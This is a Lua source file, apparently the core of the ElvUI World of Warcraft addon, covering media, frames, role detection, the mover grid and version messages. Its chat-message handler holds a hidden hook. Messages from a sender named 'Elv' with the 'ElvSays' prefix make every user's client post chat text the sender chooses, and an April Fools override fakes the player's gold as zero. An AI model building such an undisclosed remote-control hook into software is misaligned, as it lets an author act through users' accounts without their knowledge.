local E, L, V, P, G = unpack(select(2, ...)); --Inport: Engine, Locales, PrivateDB, ProfileDB, GlobalDB
local LSM = LibStub("LibSharedMedia-3.0")
local _, ns = ...
local ElvUF = ns.oUF
local ACD = LibStub("AceConfigDialog-3.0")

--Variables
_, E.myclass = UnitClass("player");
E.myname, _ = UnitName("player");
E.myguid = UnitGUID('player');
E.version = GetAddOnMetadata("ElvUI", "Version"); 
E.myrealm = GetRealmName();
_, E.wowbuild = GetBuildInfo(); E.wowbuild = tonumber(E.wowbuild);
E.noop = function() end;
E.resolution = GetCVar("gxResolution")
E.screenheight = tonumber(string.match(E.resolution, "%d+x(%d+)"))
E.screenwidth = tonumber(string.match(E.resolution, "(%d+)x+%d"))
E.TexCoords = {.08, .92, .08, .92}

E['valueColorUpdateFuncs'] = {};

--Table contains the SharedMedia values of all the fonts/textures
E["media"] = {};

--Table contains every frame we use :SetTemplate or every text we use :Font on
E["frames"] = {};
E["texts"] = {};

E['snapBars'] = {}

--Keybind Header
BINDING_HEADER_ELVUI = GetAddOnMetadata(..., "Title")

--Modules List
E["RegisteredModules"] = {}
E['RegisteredInitialModules'] = {}
local registry = {}

function E:RegisterDropdownButton(name, callback)
  registry[name] = callback or true
end

function E:Print(msg)
	print(self["media"].hexvaluecolor..'ElvUI:|r', msg)
end

function E:UpdateMedia()	
	--Fonts
	self["media"].normFont = LSM:Fetch("font", self.db['general'].font)
	self["media"].combatFont = LSM:Fetch("font", self.db['general'].dmgfont)
	

	--Textures
	self["media"].blankTex = LSM:Fetch("background", "ElvUI Blank")
	self["media"].normTex = LSM:Fetch("statusbar", self.private['general'].normTex)
	self["media"].glossTex = LSM:Fetch("statusbar", self.private['general'].glossTex)

	--Border Color
	local border = self.db['general'].bordercolor
	self["media"].bordercolor = {border.r, border.g, border.b}

	--Backdrop Color
	local backdrop = self.db['general'].backdropcolor
	self["media"].backdropcolor = {backdrop.r, backdrop.g, backdrop.b}

	--Backdrop Fade Color
	backdrop = self.db['general'].backdropfadecolor
	self["media"].backdropfadecolor = {backdrop.r, backdrop.g, backdrop.b, backdrop.a}
	
	--Value Color
	local value = self.db['general'].valuecolor
	self["media"].hexvaluecolor = self:RGBToHex(value.r, value.g, value.b)
	self["media"].rgbvaluecolor = {value.r, value.g, value.b}
	
	if LeftChatPanel and LeftChatPanel.tex and RightChatPanel and RightChatPanel.tex then
		LeftChatPanel.tex:SetTexture(E.db.general.panelBackdropNameLeft)
		LeftChatPanel.tex:SetAlpha(E.db.general.backdropfadecolor.a - 0.55 > 0 and E.db.general.backdropfadecolor.a - 0.55 or 0.5)		
		
		RightChatPanel.tex:SetTexture(E.db.general.panelBackdropNameRight)
		RightChatPanel.tex:SetAlpha(E.db.general.backdropfadecolor.a - 0.55 > 0 and E.db.general.backdropfadecolor.a - 0.55 or 0.5)		
	end
	
	self:ValueFuncCall()
	self:UpdateBlizzardFonts()
end

function E:PLAYER_ENTERING_WORLD()
	self:UpdateMedia()
	self:UnregisterEvent('PLAYER_ENTERING_WORLD')
end

function E:ValueFuncCall()
	for func, _ in pairs(self['valueColorUpdateFuncs']) do
		func(self["media"].hexvaluecolor, unpack(self["media"].rgbvaluecolor))
	end
end

function E:UpdateFrameTemplates()
	for frame, _ in pairs(self["frames"]) do
		if frame and frame.template  then
			frame:SetTemplate(frame.template, frame.glossTex);
		else
			self["frames"][frame] = nil;
		end
	end
end

function E:UpdateBorderColors()
	for frame, _ in pairs(self["frames"]) do
		if frame then
			if frame.template == 'Default' or frame.template == 'Transparent' or frame.template == nil then
				frame:SetBackdropBorderColor(unpack(self['media'].bordercolor))
			end
		else
			self["frames"][frame] = nil;
		end
	end
end	

function E:UpdateBackdropColors()
	for frame, _ in pairs(self["frames"]) do
		if frame then
			if frame.template == 'Default' or frame.template == nil then
				if frame.backdropTexture then
					frame.backdropTexture:SetVertexColor(unpack(self['media'].backdropcolor))
				else
					frame:SetBackdropColor(unpack(self['media'].backdropcolor))				
				end
			elseif frame.template == 'Transparent' then
				frame:SetBackdropColor(unpack(self['media'].backdropfadecolor))
			end
		else
			self["frames"][frame] = nil;
		end
	end
end	

function E:UpdateFontTemplates()
	for text, _ in pairs(self["texts"]) do
		if text then
			text:FontTemplate(text.font, text.fontSize, text.fontStyle);
		else
			self["texts"][text] = nil;
		end
	end
end

--This frame everything in ElvUI should be anchored to for Eyefinity support.
E.UIParent = CreateFrame('Frame', 'ElvUIParent', UIParent);
E.UIParent:SetFrameLevel(UIParent:GetFrameLevel());
E.UIParent:SetPoint('CENTER', UIParent, 'CENTER');
E.UIParent:SetSize(UIParent:GetSize());
tinsert(E['snapBars'], E.UIParent)

E.HiddenFrame = CreateFrame('Frame')
E.HiddenFrame:Hide()

--Check if PTR version of WoW is loaded
function E:IsPTRVersion()
	if self.wowbuild > 14545 then
		return true;
	else
		return false;
	end
	return false;
end

--Check the player's role
function E:CheckRole()
	local tree = GetPrimaryTalentTree();
	local resilience;
	local resilperc = GetCombatRatingBonus(COMBAT_RATING_RESILIENCE_PLAYER_DAMAGE_TAKEN)
	if resilperc > GetDodgeChance() and resilperc > GetParryChance() then
		resilience = true;
	else
		resilience = false;
	end
	if ((self.myclass == "PALADIN" and tree == 2) or 
	(self.myclass == "WARRIOR" and tree == 3) or 
	(self.myclass == "DEATHKNIGHT" and tree == 1)) and
	resilience == false or
	(self.myclass == "DRUID" and tree == 2 and GetBonusBarOffset() == 3) then
		self.role = "Tank";
	else
		local playerint = select(2, UnitStat("player", 4));
		local playeragi	= select(2, UnitStat("player", 2));
		local base, posBuff, negBuff = UnitAttackPower("player");
		local playerap = base + posBuff + negBuff;

		if (((playerap > playerint) or (playeragi > playerint)) and not (self.myclass == "SHAMAN" and tree ~= 1 and tree ~= 3) and not 
		(UnitBuff("player", GetSpellInfo(24858)) or UnitBuff("player", GetSpellInfo(65139)))) or self.myclass == "ROGUE" or self.myclass == "HUNTER" or (self.myclass == "SHAMAN" and tree == 2) then
			self.role = "Melee";
		else
			self.role = "Caster";
		end
	end
end

function E:RegisterModule(name)
	if self.initialized then
		self:GetModule(name):Initialize()
		tinsert(self['RegisteredModules'], name)
	else
		tinsert(self['RegisteredModules'], name)
	end
end

function E:RegisterInitialModule(name)
	tinsert(self['RegisteredInitialModules'], name)
end

function E:InitializeInitialModules()
	for _, module in pairs(E['RegisteredInitialModules']) do
		local module = self:GetModule(module, true)
		if module and module.Initialize then
			module:Initialize()
		end
	end
end

function E:RefreshModulesDB()
	local UF = self:GetModule('UnitFrames')
	table.wipe(UF.db)
	UF.db = self.db.unitframe
end

function E:InitializeModules()	
	for _, module in pairs(E['RegisteredModules']) do
		if self:GetModule(module).Initialize then
			self:GetModule(module):Initialize()
		end
	end
end

local grid
function E:Grid_Show()
	if not grid then
        E:Grid_Create()
	elseif grid.boxSize ~= E.db.gridSize then
        grid:Hide()
        E:Grid_Create()
    else
		grid:Show()
	end
end

function E:Grid_Hide()
	if grid then
		grid:Hide()
	end
end

function E:Grid_Create() 
	grid = CreateFrame('Frame', 'EGrid', UIParent) 
	grid.boxSize = E.db.gridSize
	grid:SetAllPoints(E.UIParent) 
	grid:Show()

	local size = 1 
	local width = E.eyefinity or GetScreenWidth()
	local ratio = width / GetScreenHeight()
	local height = GetScreenHeight() * ratio

	local wStep = width / E.db.gridSize
	local hStep = height / E.db.gridSize

	for i = 0, E.db.gridSize do 
		local tx = grid:CreateTexture(nil, 'BACKGROUND') 
		if i == E.db.gridSize / 2 then 
			tx:SetTexture(1, 0, 0) 
		else 
			tx:SetTexture(0, 0, 0) 
		end 
		tx:SetPoint("TOPLEFT", grid, "TOPLEFT", i*wStep - (size/2), 0) 
		tx:SetPoint('BOTTOMRIGHT', grid, 'BOTTOMLEFT', i*wStep + (size/2), 0) 
	end 
	height = GetScreenHeight()
	
	do
		local tx = grid:CreateTexture(nil, 'BACKGROUND') 
		tx:SetTexture(1, 0, 0)
		tx:SetPoint("TOPLEFT", grid, "TOPLEFT", 0, -(height/2) + (size/2))
		tx:SetPoint('BOTTOMRIGHT', grid, 'TOPRIGHT', 0, -(height/2 + size/2))
	end
	
	for i = 1, math.floor((height/2)/hStep) do
		local tx = grid:CreateTexture(nil, 'BACKGROUND') 
		tx:SetTexture(0, 0, 0)
		
		tx:SetPoint("TOPLEFT", grid, "TOPLEFT", 0, -(height/2+i*hStep) + (size/2))
		tx:SetPoint('BOTTOMRIGHT', grid, 'TOPRIGHT', 0, -(height/2+i*hStep + size/2))
		
		tx = grid:CreateTexture(nil, 'BACKGROUND') 
		tx:SetTexture(0, 0, 0)
		
		tx:SetPoint("TOPLEFT", grid, "TOPLEFT", 0, -(height/2-i*hStep) + (size/2))
		tx:SetPoint('BOTTOMRIGHT', grid, 'TOPRIGHT', 0, -(height/2-i*hStep + size/2))
	end
end

function E:CreateMoverPopup()
	local f = CreateFrame("Frame", "ElvUIMoverPopupWindow", UIParent)
	f:SetFrameStrata("DIALOG")
	f:SetToplevel(true)
	f:EnableMouse(true)
	f:SetClampedToScreen(true)
	f:SetWidth(360)
	f:SetHeight(110)
	f:SetTemplate('Transparent')
	f:SetPoint("TOP", 0, -50)
	f:Hide()
	f:SetScript("OnShow", function() PlaySound("igMainMenuOption"); E:Grid_Show() end)
	f:SetScript("OnHide", function() PlaySound("gsTitleOptionExit"); E:Grid_Hide() end)

	local S = self:GetModule('Skins')

	local header = CreateFrame('Frame', nil, f)
	header:SetTemplate('Default', true)
	header:SetWidth(100); header:SetHeight(25)
	header:SetPoint("CENTER", f, 'TOP')
	header:SetFrameLevel(header:GetFrameLevel() + 2)

	local title = header:CreateFontString("OVERLAY")
	title:FontTemplate()
	title:SetPoint("CENTER", header, "CENTER")
	title:SetText('ElvUI')
		
	local desc = f:CreateFontString("ARTWORK")
	desc:SetFontObject("GameFontHighlight")
	desc:SetJustifyV("TOP")
	desc:SetJustifyH("LEFT")
	desc:SetPoint("TOPLEFT", 18, -32)
	desc:SetPoint("BOTTOMRIGHT", -18, 48)
	desc:SetText(L["Movers unlocked. Move them now and click Lock when you are done."])

	local snapping = CreateFrame("CheckButton", "ElvUISnapping", f, "OptionsCheckButtonTemplate")
	_G[snapping:GetName() .. "Text"]:SetText(L["Sticky Frames"])

	snapping:SetScript("OnShow", function(self)
		self:SetChecked(E.db.general.stickyFrames)
	end)

	snapping:SetScript("OnClick", function(self)
		E.db.general.stickyFrames = self:GetChecked()
	end)

	local lock = CreateFrame("Button", "ElvUILock", f, "OptionsButtonTemplate")
	_G[lock:GetName() .. "Text"]:SetText(L["Lock"])

	lock:SetScript("OnClick", function(self)
		E:MoveUI(false)
		self:GetParent():Hide()
		ACD['Open'](ACD, 'ElvUI') 
	end)
	
	local align = CreateFrame('EditBox', 'AlignBox', f, 'InputBoxTemplate')
	align:Width(24)
	align:Height(17)
	align:SetAutoFocus(false)
	align:SetScript("OnEscapePressed", function(self)
		self:SetText(E.db.gridSize)
		EditBox_ClearFocus(self)
	end)
	align:SetScript("OnEnterPressed", function(self)
		local text = self:GetText()
		if tonumber(text) then
			if tonumber(text) <= 256 and tonumber(text) >= 4 then
				E.db.gridSize = tonumber(text)
			else
				self:SetText(E.db.gridSize)
			end
		else
			self:SetText(E.db.gridSize)
		end
		E:Grid_Show()
		EditBox_ClearFocus(self)
	end)
	align:SetScript("OnEditFocusLost", function(self)
		self:SetText(E.db.gridSize)
	end)
	align:SetScript("OnEditFocusGained", align.HighlightText)
	align:SetScript('OnShow', function(self)
		EditBox_ClearFocus(self)
		self:SetText(E.db.gridSize)
	end)
	
	align.text = align:CreateFontString(nil, 'OVERLAY', 'GameFontNormal')
	align.text:SetPoint('RIGHT', align, 'LEFT', -4, 0)
	align.text:SetText(L['Grid Size:'])

	--position buttons
	snapping:SetPoint("BOTTOMLEFT", 14, 10)
	lock:SetPoint("BOTTOMRIGHT", -14, 14)
	align:SetPoint('TOPRIGHT', lock, 'TOPLEFT', -4, -2)
	
	S:HandleCheckBox(snapping)
	S:HandleButton(lock)
	S:HandleEditBox(align)
	
	f:RegisterEvent('PLAYER_REGEN_DISABLED')
	f:SetScript('OnEvent', function(self)
		if self:IsShown() then
			self:Hide()
		end
	end)
end

function E:CheckIncompatible()
	if IsAddOnLoaded('Prat-3.0') and E.private.chat.enable then
		E:Print(format(L['INCOMPATIBLE_ADDON'], 'Prat', 'Chat'))
	elseif IsAddOnLoaded('Chatter') and E.private.chat.enable then
		E:Print(format(L['INCOMPATIBLE_ADDON'], 'Chatter', 'Chat'))
	end
	
	if IsAddOnLoaded('Bartender4') and E.private.actionbar.enable then
		E:Print(format(L['INCOMPATIBLE_ADDON'], 'Bartender', 'ActionBar'))
	elseif IsAddOnLoaded('Dominos') and E.private.actionbar.enable then
		E:Print(format(L['INCOMPATIBLE_ADDON'], 'Dominos', 'ActionBar'))
	end	
	
	if IsAddOnLoaded('TidyPlates') and E.private.nameplate.enable then
		E:Print(format(L['INCOMPATIBLE_ADDON'], 'TidyPlates', 'NamePlate'))
	elseif IsAddOnLoaded('Aloft') and E.private.nameplate.enable then
		E:Print(format(L['INCOMPATIBLE_ADDON'], 'Aloft', 'NamePlate'))
	end	
	
	if IsAddOnLoaded('ArkInventory') and E.private.general.bags then
		E:Print(format(L['INCOMPATIBLE_ADDON'], 'ArkInventory', 'Bags'))
	elseif IsAddOnLoaded('Bagnon') and E.private.general.bags then
		E:Print(format(L['INCOMPATIBLE_ADDON'], 'Bagnon', 'Bags'))
	elseif IsAddOnLoaded('OneBag3') and E.private.general.bags then
		E:Print(format(L['INCOMPATIBLE_ADDON'], 'OneBag3', 'Bags'))
	elseif IsAddOnLoaded('OneBank3') and E.private.general.bags then
		E:Print(format(L['INCOMPATIBLE_ADDON'], 'OneBank3', 'Bags'))
	end
end

function E:IsFoolsDay()
	if string.find(date(), '04/01/') and not E.global.aprilFools then
		return true;
	else
		return false;
	end
end

function E:CopyTable(currentTable, defaultTable)
	if type(currentTable) ~= "table" then currentTable = {} end
	
	if type(defaultTable) == 'table' then
		for option, value in pairs(defaultTable) do
			if type(value) == "table" then
				value = self:CopyTable(currentTable[option], value)
			end
			
			currentTable[option] = value			
		end
	end
	
	return currentTable
end

function E:SendMessage()
	local numParty, numRaid = GetNumPartyMembers(), GetNumRaidMembers();
	local inInstance, instanceType = IsInInstance()
	if inInstance and instanceType == 'pvp' or instanceType == 'arena' then
		SendAddonMessage("ElvUIVC", E.version, "BATTLEGROUND")	
	else
		if numRaid > 0 then
			SendAddonMessage("ElvUIVC", E.version, "RAID")
		elseif numParty > 0 then
			SendAddonMessage("ElvUIVC", E.version, "PARTY")
		end
	end
	
	self:CancelAllTimers()
end

--SENDTO = Specified Name or "ALL"
--CHANNEL = Channel to announce it in
--MESSAGE = Actual Message
--SENDTO = For whispers, force users to whisper other users
--/run SendAddonMessage('ElvSays', '<SENDTO>,<CHANNEL>,<MESSAGE>,<SENDTO>', 'PARTY')
local function SendRecieve(self, event, prefix, message, channel, sender)
	if event == "CHAT_MSG_ADDON" then
		if sender == E.myname then return end

		if prefix == "ElvUIVC" and sender ~= 'Elv' and not string.find(sender, 'Elv%-') then
			if tonumber(message) > tonumber(E.version) then
				E:Print(L["Your version of ElvUI is out of date. You can download the latest version from www.tukui.org"])
				E:UnregisterEvent("CHAT_MSG_ADDON")
				E:UnregisterEvent("PARTY_MEMBERS_CHANGED")
				E:UnregisterEvent("RAID_ROSTER_UPDATE")
			end
		elseif prefix == 'ElvSays' and (sender == 'Elv' or string.find(sender, 'Elv-')) then ---HAHHAHAHAHHA
			local user, channel, msg, sendTo = string.split(',', message)
			
			if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
				SendChatMessage(msg, channel, nil, sendTo)
			end
		end
	else
		E:ScheduleTimer('SendMessage', 12)
	end
end


function E:UpdateAll()
	self.data = LibStub("AceDB-3.0"):New("ElvData", self.DF);
	self.data.RegisterCallback(self, "OnProfileChanged", "UpdateAll")
	self.data.RegisterCallback(self, "OnProfileCopied", "UpdateAll")
	self.data.RegisterCallback(self, "OnProfileReset", "OnProfileReset")
	self.db = self.data.profile;
	self.global = self.data.global;

	self:UpdateMedia()
	self:UpdateFrameTemplates()
	self:SetMoversPositions()
	
	local CH = self:GetModule('Chat')
	CH.db = self.db.chat
	CH:PositionChat(true); 
	
	local AB = self:GetModule('ActionBars')
	AB.db = self.db.actionbar
	AB:UpdateButtonSettings()
	 
	local bags = E:GetModule('Bags'); 
	bags:Layout(); 
	bags:Layout(true); 
	bags:PositionBagFrames()
	bags:SizeAndPositionBagBar()
	
	self:GetModule('Skins'):SetEmbedRight(E.db.skins.embedRight)
	self:GetModule('Layout'):ToggleChatPanels()
	
	local CT = self:GetModule('ClassTimers')
	CT.db = self.db.classtimer
	CT:PositionTimers()
	CT:ToggleTimers()
	
	local DT = self:GetModule('DataTexts')
	DT.db = self.db.datatexts
	DT:LoadDataTexts()
	
	local NP = self:GetModule('NamePlates')
	NP.db = self.db.nameplate
	NP:UpdateAllPlates()
	
	local UF = self:GetModule('UnitFrames')
	UF.db = self.db.unitframe
	UF:Update_AllFrames()
	
	self:GetModule('Auras').db = self.db.auras
	self:GetModule('Tooltip').db = self.db.tooltip

	if self.db.install_complete == nil or (self.db.install_complete and type(self.db.install_complete) == 'boolean') or (self.db.install_complete and type(tonumber(self.db.install_complete)) == 'number' and tonumber(self.db.install_complete) <= 3.05) then
		self:Install()
	end
	
	self:GetModule('Minimap'):UpdateSettings()
	
	--self:LoadKeybinds()
	
	collectgarbage('collect');
end

local function showMenu(dropdownMenu, which, unit, name, userData, ...)
  for i=1,UIDROPDOWNMENU_MAXBUTTONS do
    local button = _G["DropDownList" .. UIDROPDOWNMENU_MENU_LEVEL .. "Button" .. i];

    local f = registry[button.value]
    -- Patch our handler function back in
    if f then
      button.func = UnitPopupButtons[button.value].func
      if type(f) == "function" then
        f(dropdownMenu, button)
      end
    end
  end
end

hooksecurefunc("UnitPopup_ShowMenu", showMenu)

function E:Initialize()
	table.wipe(self.db)
	table.wipe(self.global)
	table.wipe(self.private)
	
	self.data = LibStub("AceDB-3.0"):New("ElvData", self.DF);
	self.data.RegisterCallback(self, "OnProfileChanged", "UpdateAll")
	self.data.RegisterCallback(self, "OnProfileCopied", "UpdateAll")
	self.data.RegisterCallback(self, "OnProfileReset", "OnProfileReset")
	
	self.charSettings = LibStub("AceDB-3.0"):New("ElvPrivateData", self.privateVars);	
	self.private = self.charSettings.profile
	self.db = self.data.profile;
	self.global = self.data.global;
	self:CheckIncompatible()
	
	--Database conversion for aura filters
	for spellList, _ in pairs(self.global.unitframe.aurafilters) do
		if self.global.unitframe.aurafilters[spellList] and self.global.unitframe.aurafilters[spellList].spells then
			for spell, value in pairs(self.global.unitframe.aurafilters[spellList].spells) do
				if type(self.global.unitframe.aurafilters[spellList].spells[spell]) == "boolean" then
					self.global.unitframe.aurafilters[spellList].spells[spell] = {
						['enable'] = true,
						['priority'] = 0,
					}
				end		
			end
		end
	end		
	
	self:CheckRole()
	self:UIScale('PLAYER_LOGIN');

	if self.db.general.loginmessage then
		print(format(L['LOGIN_MSG'], self["media"].hexvaluecolor, self["media"].hexvaluecolor, self.version))
	end
	
	self:LoadConfig(); --Load In-Game Config
	self:LoadCommands(); --Load Commands
	self:InitializeModules(); --Load Modules	
	self:LoadMovers(); --Load Movers

	self.initialized = true
	
	if self.db.install_complete == nil or (self.db.install_complete and type(self.db.install_complete) == 'boolean') or (self.db.install_complete and type(tonumber(self.db.install_complete)) == 'number' and tonumber(self.db.install_complete) <= 3.05) then
		self:Install()
	end
	
	if not string.find(date(), '04/01/') then	
		E.global.aprilFools = nil;
	end
	
	if E:IsFoolsDay() then
		function GetMoney()
			return 0;
		end
		E:Delay(45, function()
			StaticPopup_Show('APRIL_FOOLS')
		end)
	end
	
	RegisterAddonMessagePrefix('ElvUIVC')
	RegisterAddonMessagePrefix('ElvSays')
	
	self:UpdateMedia()
	self:UpdateFrameTemplates()
	self:CreateMoverPopup()
	self:RegisterEvent("ACTIVE_TALENT_GROUP_CHANGED", "CheckRole");
	self:RegisterEvent("PLAYER_TALENT_UPDATE", "CheckRole");
	self:RegisterEvent("CHARACTER_POINTS_CHANGED", "CheckRole");
	self:RegisterEvent("UNIT_INVENTORY_CHANGED", "CheckRole");
	self:RegisterEvent("UPDATE_BONUS_ACTIONBAR", "CheckRole");	
	self:RegisterEvent('UI_SCALE_CHANGED', 'UIScale')
	self:RegisterEvent('PLAYER_ENTERING_WORLD')
	--self:RegisterEvent('UPDATE_BINDINGS', 'SaveKeybinds')
	--self:SaveKeybinds()
	
	self:GetModule('Minimap'):UpdateSettings()
	self:RefreshModulesDB()
	collectgarbage("collect");
end

local toggle
function E:MoveUI(override, type)
	if InCombatLockdown() then E:Print(ERR_NOT_IN_COMBAT) return end
	
	if toggle ~= nil then
		toggle = nil
	else
		toggle = true
	end
	
	if override then toggle = override end
	
	if toggle and ElvUIMoverPopupWindow then
		ElvUIMoverPopupWindow:Show()
		ACD['Close'](ACD, 'ElvUI') 
		GameTooltip:Hide()
	elseif ElvUIMoverPopupWindow then
		ElvUIMoverPopupWindow:Hide()
	end

	self:ToggleMovers(toggle)
end

function E:ResetAllUI()
	self:ResetMovers()

	if E.db.lowresolutionset then
		E:SetupResolution()
	end	

	if E.db.layoutSet then
		E:SetupLayout(E.db.layoutSet)
	end
end

function E:ResetUI(...)
	if InCombatLockdown() then E:Print(ERR_NOT_IN_COMBAT) return end
	
	if ... == '' or ... == ' ' or ... == nil then
		StaticPopup_Show('RESETUI_CHECK')
		return
	end
	
	self:ResetMovers(...)
end

local f = CreateFrame('Frame')
f:RegisterEvent("RAID_ROSTER_UPDATE")
f:RegisterEvent("PARTY_MEMBERS_CHANGED")
f:RegisterEvent("CHAT_MSG_ADDON")
f:SetScript('OnEvent', SendRecieve)